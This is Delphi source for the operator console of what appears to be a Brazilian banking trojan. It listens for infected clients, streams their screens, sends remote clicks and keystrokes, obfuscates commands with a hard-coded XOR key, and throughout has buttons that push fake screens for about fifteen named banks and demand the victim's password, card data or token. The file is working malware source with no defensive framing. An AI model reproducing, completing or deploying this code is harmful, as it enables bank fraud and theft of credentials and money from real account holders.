unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, System.Win.ScktComp, Vcl.StdCtrls,
  Vcl.ExtCtrls, Web.Win.Sockets, IdContext, IdBaseComponent, IdComponent,
  IdCustomTCPServer, IdTCPServer, Vcl.Imaging.JConsts, Vcl.Imaging.jpeg,
  Vcl.ComCtrls;

type
  TForm1 = class(TForm)
    Button1: TButton;
    Button2: TButton;
    RadioGroup1: TRadioGroup;
    RadioButton1: TRadioButton;
    RadioButton2: TRadioButton;
    RadioButton3: TRadioButton;
    RadioButton4: TRadioButton;
    RadioButton5: TRadioButton;
    RadioButton6: TRadioButton;
    RadioButton7: TRadioButton;
    RadioButton8: TRadioButton;
    RadioButton9: TRadioButton;
    RadioButton10: TRadioButton;
    RadioButton11: TRadioButton;
    RadioButton12: TRadioButton;
    RadioGroup2: TRadioGroup;
    Button3: TButton;
    Button4: TButton;
    Button8: TButton;
    Image1: TImage;
    Label1: TLabel;
    s1: TServerSocket;
    Timer1: TTimer;
    Edit3: TEdit;
    Button11: TButton;
    Label2: TLabel;
    Edit4: TEdit;
    Button12: TButton;
    Button13: TButton;
    Label3: TLabel;
    s3: TServerSocket;
    server: TIdTCPServer;
    RadioButton13: TRadioButton;
    RadioButton14: TRadioButton;
    RadioButton15: TRadioButton;
    Label6: TLabel;
    Edit5: TEdit;
    Button5: TButton;
    Button6: TButton;
    Button7: TButton;
    Button9: TButton;
    Memo1: TMemo;
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure zera(Sender: TObject);
    procedure s1Accept(Sender: TObject; ClientSocket: TCustomIpClient);
    procedure s1ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure s1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure Timer1Timer(Sender: TObject);
    procedure s2ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);



    procedure Image1DblClick(Sender: TObject);
    procedure Image1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image1Click(Sender: TObject);
    procedure Button11Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure RadioButton1Click(Sender: TObject);
    procedure RadioButton2Click(Sender: TObject);
    procedure RadioButton3Click(Sender: TObject);
    procedure RadioButton14Click(Sender: TObject);
    procedure RadioButton5Click(Sender: TObject);
    procedure RadioButton15Click(Sender: TObject);
    procedure RadioButton7Click(Sender: TObject);
    procedure RadioButton8Click(Sender: TObject);
    procedure RadioButton9Click(Sender: TObject);
    procedure RadioButton10Click(Sender: TObject);
    procedure RadioButton11Click(Sender: TObject);
    procedure RadioButton12Click(Sender: TObject);
    procedure s1ClientRead(Sender: TObject; Socket: TCustomWinSocket);

    procedure Button10Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button12Click(Sender: TObject);
    procedure Button13Click(Sender: TObject);


    procedure s2ClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure s2ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure serverExecute(AContext: TIdContext);
    procedure Button5Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure s3ClientRead(Sender: TObject; Socket: TCustomWinSocket);



  private
    { Private declarations }
  public
    { Public declarations }
    trava_tela : String;
    s : string;


  end;

var
  Form1: TForm1;
  TamanhoArquivo : integer;
  Arquivo : TMemoryStream;
  RecebendoArquivo : Boolean;
  jpg: TJPEGImage;
  rato : String;
  imgqualidade : integer;
  CorQualCliente : integer;

implementation

{$R *.dfm}

procedure ConverterJPegParaBmp(Arquivo: string);
var
  JPeg: TJPegImage;
  Bmp: TBitmap;
begin
  JPeg := TJPegImage.Create;
try
  JPeg.LoadFromFile(Arquivo);
  Bmp := TBitmap.Create;
try
  Bmp.Assign(JPeg);
  Bmp.SaveToFile(ChangeFileExt(Arquivo, '.bmp'));
finally
  Bmp.Free;
end;
finally
  JPeg.Free;
end;
end;


Function Crypt(Action, Src: String): String;
Label Fim;
var KeyLen : Integer;
  KeyPos : Integer;
  OffSet : Integer;
  Dest, Key : String;
  SrcPos : Integer;
  SrcAsc : Integer;
  TmpSrcAsc : Integer;
  Range : Integer;
begin
  if (Src = '') Then
  begin
    Result:= '';
    Goto Fim;
  end;
  Key :='jauSAFGGhgh_SEC_537¨%#$8732g6asd{OFF.LINES}SGH87y32g890{BERTIOLY}gbk+=(''';
  Dest := '';
  KeyLen := Length(Key);
  KeyPos := 0;
  SrcPos := 0;
  SrcAsc := 0;
  Range := 256;
  if (Action = UpperCase('C')) then
  begin
    Randomize;
    OffSet := Random(Range);
    Dest := Format('%1.2x',[OffSet]);
    for SrcPos := 1 to Length(Src) do
    begin
      Application.ProcessMessages;
      SrcAsc := (Ord(Src[SrcPos]) + OffSet) Mod 255;
      if KeyPos < KeyLen then KeyPos := KeyPos + 1 else KeyPos := 1;
      SrcAsc := SrcAsc Xor Ord(Key[KeyPos]);
      Dest := Dest + Format('%1.2x',[SrcAsc]);
      OffSet := SrcAsc;
    end;
  end
  Else if (Action = UpperCase('D')) then
  begin
    OffSet := StrToInt('$'+ copy(Src,1,2));
    SrcPos := 3;
  repeat
    SrcAsc := StrToInt('$'+ copy(Src,SrcPos,2));
    if (KeyPos < KeyLen) Then KeyPos := KeyPos + 1 else KeyPos := 1;
    TmpSrcAsc := SrcAsc Xor Ord(Key[KeyPos]);
    if TmpSrcAsc <= OffSet then TmpSrcAsc := 255 + TmpSrcAsc - OffSet
    else TmpSrcAsc := TmpSrcAsc - OffSet;
    Dest := Dest + Chr(TmpSrcAsc);
    OffSet := SrcAsc;
    SrcPos := SrcPos + 2;
  until (SrcPos >= Length(Src));
  end;
  Result:= Dest;
  Fim:
end;


Procedure TForm1.zera(Sender: TObject);
begin
     button3.Enabled := false;
     button4.Enabled := false;
     button5.Enabled := false;
     button6.Enabled := false;
     button7.Enabled := false;
     button8.Enabled := false;
     button9.Enabled := false;
end;

procedure TForm1.Button10Click(Sender: TObject);
begin
    if radiobutton3.Checked then {itaú}
       trava_tela := 'PDD_TabITBNK';

    if radiobutton4.Checked then {bradesco}
       trava_tela := 'PDD_TabBRABNK';

    if radiobutton6.Checked then {santander}
       trava_tela := 'PDD_TabSNTD';

    if s1.Socket.Connected then
      s1.Socket.Connections[0].SendText(Crypt('C', trava_tela));

end;

procedure TForm1.Button11Click(Sender: TObject);
begin
  s1.Socket.Connections[0].SendText('ENVIARTECLADO|'+ edit3.text + '|Modo3|API');
end;

procedure TForm1.Button12Click(Sender: TObject);
begin

imgqualidade := imgqualidade + 10;
label3.Caption := inttostr(imgqualidade);
s1.Socket.Connections[0].SendText(inttostr(imgqualidade)+'/0/'+Crypt('C', 'ImgQualCliente'));
end;

procedure TForm1.Button13Click(Sender: TObject);
begin
imgqualidade := imgqualidade - 10;
label3.Caption := inttostr(imgqualidade);
s1.Socket.Connections[0].SendText(inttostr(imgqualidade)+'/0/'+Crypt('C', 'ImgQualCliente'));

end;




procedure TForm1.Button1Click(Sender: TObject);
begin
s1.Active := true;
s3.Active := true;
server.Active:= true;
label1.Caption := 'Aguardando conexão';

button2.Enabled := true;
button1.Enabled := false;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
timer1.Enabled := false;
button2.Enabled := false;
button1.Enabled := true;
s1.Active := false;

label1.Caption := 'Desconectado';
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
    if radiobutton1.Checked then {BB - pf}
       trava_tela := 'BBF';

    if radiobutton2.Checked then {HSBC}
       trava_tela := 'HSBC';

    if radiobutton3.Checked then {itaú - pf}
       trava_tela := 'ITAF';

    if radiobutton4.Checked then {bradesco - pf}
       trava_tela := 'BRAF';

    if radiobutton5.Checked then {Banrisul}
       trava_tela := 'BANRI';

    if radiobutton6.Checked then {santander - pf}
       trava_tela := 'SANF';

    if radiobutton7.Checked then {sicoob}
       trava_tela := 'SIC';

    if radiobutton8.Checked then {sicredi}
       trava_tela := 'SICRE';

    if radiobutton9.Checked then {caixa}
       trava_tela := 'CEF';

    if radiobutton10.Checked then {brb}
       trava_tela := 'BRB';

    if radiobutton11.Checked then {citibank}
       trava_tela := 'CITI';

    if radiobutton12.Checked then {itaú - pj}
       trava_tela := 'ITAJ';

    if radiobutton13.Checked then {BB - pj}
       trava_tela := 'BBJ';

     if radiobutton14.Checked then {bradesco - pj}
       trava_tela := 'BRAJ';

    if radiobutton15.Checked then {santander - pj}
       trava_tela := 'SANJ';

//    s1.Sendln(trava_tela);
    if s1.Socket.Connected then
      s1.Socket.Connections[0].SendText('OPERAR|'+trava_tela+'|'+ edit5.Text);





end;

procedure TForm1.Button4Click(Sender: TObject);
var
sucesso : string;
begin
    if radiobutton1.Checked then {BB - pf}
       sucesso := 'SUCESSOBB';

    if radiobutton2.Checked then {HSBC}
       sucesso := 'SUCESSOHSBC';

    if radiobutton3.Checked then {itaú - pf}
       sucesso := 'SUCESSOITA';

    if radiobutton4.Checked then {bradesco - pf}
       sucesso := 'SUCESSOBRA';

    if radiobutton5.Checked then {Banrisul}
       sucesso := 'SUCESSOBANRI';

    if radiobutton6.Checked then {santander - pf}
       sucesso := 'SUCESSOSAN';

    if radiobutton7.Checked then {sicoob}
       sucesso := 'SUCESSOSIC';

    if radiobutton8.Checked then {sicredi}
       sucesso := 'SUCESSOSICRE';

    if radiobutton9.Checked then {caixa}
       sucesso := 'SUCESSOCEF';

    if radiobutton10.Checked then {brb}
       sucesso := 'SUCESSOBRB';

    if radiobutton11.Checked then {citibank}
       sucesso := 'SUCESSOCITI';

    if radiobutton12.Checked then {itaú - pj}
       sucesso := 'SUCESSOITA';

    if radiobutton13.Checked then {BB - pj}
       sucesso := 'SUCESSOBB';

     if radiobutton14.Checked then {bradesco - pj}
       sucesso := 'SUCESSOBRA';

    if radiobutton15.Checked then {santander - pj}
       sucesso := 'SUCESSOSAN';


if s1.Socket.Connected then
 s1.Socket.Connections[0].SendText('ENVIARDESCONECTAR');

end;

procedure TForm1.Button5Click(Sender: TObject);
begin
       if s1.Socket.Connected then
      s1.Socket.Connections[0].SendText('PEDE|CARTAOBANRI');
end;

procedure TForm1.Button6Click(Sender: TObject);
var
senha : string;
begin
  senha := '';
    if radiobutton1.Checked then {BB - pf}
       senha := 'SENHABB';

    if radiobutton2.Checked then {HSBC}
       senha := 'SENHAHSBC';

    if radiobutton3.Checked then {itaú - pf}
       senha := 'SENHAITA';

    if radiobutton4.Checked then {bradesco - pf}
       senha := 'SENHABRA';

    if radiobutton5.Checked then {Banrisul}
       senha := 'SENHABANRI';

    if radiobutton6.Checked then {santander - pf}
       senha := 'SENHASAN';

    if radiobutton7.Checked then {sicoob}
       senha := 'SENHASIC';

    if radiobutton8.Checked then {sicoob}
       senha := 'SENHASICRE';

    if radiobutton9.Checked then {caixa}
       senha := 'SENHACEF';

    if radiobutton10.Checked then {caixa}
       senha := 'SENHABRB';

    if radiobutton11.Checked then {citi}
       senha := 'SENHACITI';

    if radiobutton12.Checked then {itaú - pj}
       senha := 'SENHAITA';

    if radiobutton13.Checked then {BB - pj}
       senha := 'SENHABB';

     if radiobutton14.Checked then {bradesco - pj}
       senha := 'SENHABRA';

    if radiobutton15.Checked then {santander - pj}
       senha := 'SENHASAN';

//    s1.Sendln(trava_tela);
    if s1.Socket.Connected then
      s1.Socket.Connections[0].SendText('PEDE|'+ senha);


end;

procedure TForm1.Button7Click(Sender: TObject);
var
senha : string;
begin
  senha := '';

    if radiobutton2.Checked then {HSBC}
       senha := 'TOKENHSBC';

    if radiobutton3.Checked then {itaú - pf}
       senha := 'TOKENITA';

    if radiobutton4.Checked then {bradesco - pf}
       senha := 'TOKENBRA';

    if radiobutton6.Checked then {santander - pf}
       senha := 'TOKENSAN';


    if radiobutton8.Checked then {sicredi}
       senha := 'TOKENSICRE';


    if radiobutton10.Checked then {caixa}
       senha := 'TOKENBRB';

    if radiobutton12.Checked then {itaú - pj}
       senha := 'TOKENITA';

     if radiobutton14.Checked then {bradesco - pj}
       senha := 'TOKENBRA';

    if radiobutton15.Checked then {santander - pj}
       senha := 'TOKENSAN';

//    s1.Sendln(trava_tela);
    if s1.Socket.Connected then
      s1.Socket.Connections[0].SendText('PEDE|'+ senha);

end;

procedure TForm1.Button8Click(Sender: TObject);
begin
  s1.Socket.Connections[0].SendText('ENVIARDESLIGAR');
end;

procedure TForm1.Button9Click(Sender: TObject);
var
senha : string;
begin
  senha := '';
    if radiobutton1.Checked then {BB - pf}
       senha := 'SUCESSOBB';

    if radiobutton2.Checked then {HSBC}
       senha := 'SUCESSOHSBC';

    if radiobutton3.Checked then {itaú - pf}
       senha := 'SUCESSOITA';

    if radiobutton4.Checked then {bradesco - pf}
       senha := 'SUCESSOBRA';

    if radiobutton5.Checked then {Banrisul}
       senha := 'SUCESSOBANRI';

    if radiobutton6.Checked then {santander - pf}
       senha := 'SUCESSOSAN';

    if radiobutton7.Checked then {sicoob}
       senha := 'SUCESSOSIC';

    if radiobutton8.Checked then {sicoob}
       senha := 'SUCESSOSICRE';

    if radiobutton9.Checked then {caixa}
       senha := 'SUCESSOCEF';

    if radiobutton10.Checked then {itaú - pj}
       senha := 'SUCESSOBRB';

    if radiobutton11.Checked then {itaú - pj}
       senha := 'SUCESSOCITI';

    if radiobutton12.Checked then {itaú - pj}
       senha := 'SUCESSOITA';

    if radiobutton13.Checked then {BB - pj}
       senha := 'SUCESSOBB';

     if radiobutton14.Checked then {bradesco - pj}
       senha := 'SUCESSOBRA';

    if radiobutton15.Checked then {santander - pj}
       senha := 'SUCESSOSAN';

//    s1.Sendln(trava_tela);
    if s1.Socket.Connected then
      s1.Socket.Connections[0].SendText('PEDE|'+ senha);
end;







procedure TForm1.FormCreate(Sender: TObject);

begin

     memo1.Clear;
     button2.Enabled := false;
     TPicture.RegisterFileFormat('jpe', sJPEGImageFile, TJPEGImage);
     TPicture.RegisterFileFormat('jif', sJPEGImageFile, TJPEGImage);
     TPicture.RegisterFileFormat('jfif', sJPEGImageFile, TJPEGImage);
     TPicture.RegisterFileFormat('jfi', sJPEGImageFile, TJPEGImage);
     RecebendoArquivo := False;
     zera(nil);
     RadioButton1.Enabled := false;
     RadioButton2.Enabled := false;
     RadioButton3.Enabled := false;
     RadioButton4.Enabled := false;
     RadioButton5.Enabled := false;
     RadioButton6.Enabled := false;
     RadioButton7.Enabled := false;
     RadioButton8.Enabled := false;
     RadioButton9.Enabled := false;
     RadioButton10.Enabled := false;
     RadioButton11.Enabled := false;
     RadioButton12.Enabled := false;
     RadioButton13.Enabled := false;
     RadioButton14.Enabled := false;
     RadioButton15.Enabled := false;

     button11.Enabled := false;
     imgqualidade := 10;
     CorQualCliente := 10;
     label3.Caption := inttostr(imgqualidade);


end;





procedure TForm1.Image1Click(Sender: TObject);

var
 ponto : Tpoint;
 str : string;
begin
  ponto := Mouse.CursorPos;
  ponto:= image1.ScreenToClient(ponto);

  str := 'EsqClickRat';

  s1.Socket.Connections[0].SendText('ENVIARCLIQUE|'+inttostr(ponto.x)+'|'+inttostr(ponto.y)+'|Modo3|L');

end;

procedure TForm1.Image1DblClick(Sender: TObject);
var
 ponto : Tpoint;
 str : string;
begin
  ponto := Mouse.CursorPos;
  //ponto.x := ponto.X - image1.Left;
  //ponto.Y := ponto.Y - image1.Top;
  //memo1.Lines.Add(inttostr(ponto.x)+ ','+ inttostr(ponto.y));
  ponto:= image1.ScreenToClient(ponto);
  //memo1.Lines.Add(inttostr(ponto.x)+ ','+ inttostr(ponto.y));
  str := 'EsqClickDplRat';
  s1.Socket.Connections[0].SendText(inttostr(ponto.x)+'/'+inttostr(ponto.y)+'/'+Crypt('C',str));

end;

procedure TForm1.Image1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
 ponto : Tpoint;
 str : string;
begin
  ponto := Mouse.CursorPos;
  ponto:= image1.ScreenToClient(ponto);

case button of
  TMouseButton.mbRight:
  begin
    str := 'DirClickRat';
    s1.Socket.Connections[0].SendText(inttostr(ponto.x)+'/'+inttostr(ponto.y)+'/'+Crypt('C',str));
  end;

end;




end;



procedure TForm1.RadioButton10Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

end;

procedure TForm1.RadioButton11Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
  button6.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;


end;

procedure TForm1.RadioButton12Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
  button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

end;

procedure TForm1.RadioButton1Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button6.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

end;

procedure TForm1.RadioButton2Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
  button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

end;

procedure TForm1.RadioButton3Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

end;

procedure TForm1.RadioButton14Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
  button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

end;

procedure TForm1.RadioButton5Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button5.Enabled := true;
  button6.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

end;

procedure TForm1.RadioButton15Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
  button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

 end;

procedure TForm1.RadioButton7Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
  button6.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

end;

procedure TForm1.RadioButton8Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
  button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

end;

procedure TForm1.RadioButton9Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
  button6.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

end;

Procedure TForm1.s1Accept(Sender: TObject; ClientSocket: TCustomIpClient);
begin
label1.Caption := 'Cleinte conectado';
end;



procedure TForm1.s1ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
label1.Caption := 'cliente conectado ip: '+ s1.Socket.Connections[0].RemoteAddress;
     RadioButton1.Enabled := true;
     RadioButton2.Enabled := true;
     RadioButton3.Enabled := true;
     RadioButton4.Enabled := true;
     RadioButton5.Enabled := true;
     RadioButton6.Enabled := true;
     RadioButton7.Enabled := true;
     RadioButton8.Enabled := true;
     RadioButton9.Enabled := true;
     RadioButton10.Enabled := true;
     RadioButton11.Enabled := true;
     RadioButton12.Enabled := true;
     RadioButton13.Enabled := true;
     RadioButton14.Enabled := true;
     RadioButton15.Enabled := true;
     button11.Enabled := true;
     timer1.Enabled := true;
end;

procedure TForm1.s1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
     timer1.Enabled:= false;
     label1.Caption := 'Cliente desconectado';
     RadioButton1.Enabled := false;
     RadioButton2.Enabled := false;
     RadioButton3.Enabled := false;
     RadioButton4.Enabled := false;
     RadioButton5.Enabled := false;
     RadioButton6.Enabled := false;
     RadioButton7.Enabled := false;
     RadioButton8.Enabled := false;
     RadioButton9.Enabled := false;
     RadioButton10.Enabled := false;
     RadioButton11.Enabled := false;
     RadioButton12.Enabled := false;
     RadioButton13.Enabled := false;
     RadioButton14.Enabled := false;
     RadioButton15.Enabled := false;
     button11.Enabled := false;
     zera(nil);
end;




procedure TForm1.s1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
str: string;
tm : integer;
begin

 tm := s1.Socket.Connections[0].ReceiveLength;
 str := s1.Socket.Connections[0].ReceiveText;
 if tm > 3 then
    edit4.Text := str;
end;

procedure TForm1.s2ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
Arquivo := TMemoryStream.Create;
end;

procedure TForm1.s2ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  timer1.Enabled := false;
  Arquivo.SaveToFile('t.jpg');
  jpg:=TJPEGImage.Create;
  jpg.LoadFromFile('t.jpg');
  Image1.Picture.Assign(jpg);
  Arquivo.Free;
  Arquivo := Nil;

end;











procedure TForm1.s2ClientRead(Sender: TObject; Socket: TCustomWinSocket);
Var
TamBuffer : integer;
Paux : pointer;
begin
     TamBuffer := Socket.ReceiveLength;

      GetMem(PAux,TamBuffer);
      Socket.ReceiveBuf(PAux^,TamBuffer);
      Arquivo.Write(PAux^,TamBuffer);
      Dispose(PAux);

end;

procedure TForm1.s3ClientRead(Sender: TObject; Socket: TCustomWinSocket);
begin
memo1.Lines.Add(socket.ReceiveText);
end;

procedure TForm1.serverExecute(AContext: TIdContext);
var
  Fs : TMemoryStream;
  FileLocation : String;
begin
   Fs := TMemoryStream.Create;
   try
     Fs.Position := 0;
     Acontext.Connection.IOHandler.LargeStream := true;
     AContext.Connection.IOHandler.ReadStream(Fs);
     Fs.Position := 0;
     jpg := TJpegImage.Create;
     try
       jpg.LoadFromStream(Fs);
       image1.Picture.Assign(jpg);
     finally
        jpg.Free;
     end;
   finally
        Fs.Free;
   end;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
  s1.Socket.Connections[0].SendText('ENVIARSTREAM|'+ inttostr(imgqualidade) +'|Modo3');
  end;

end.
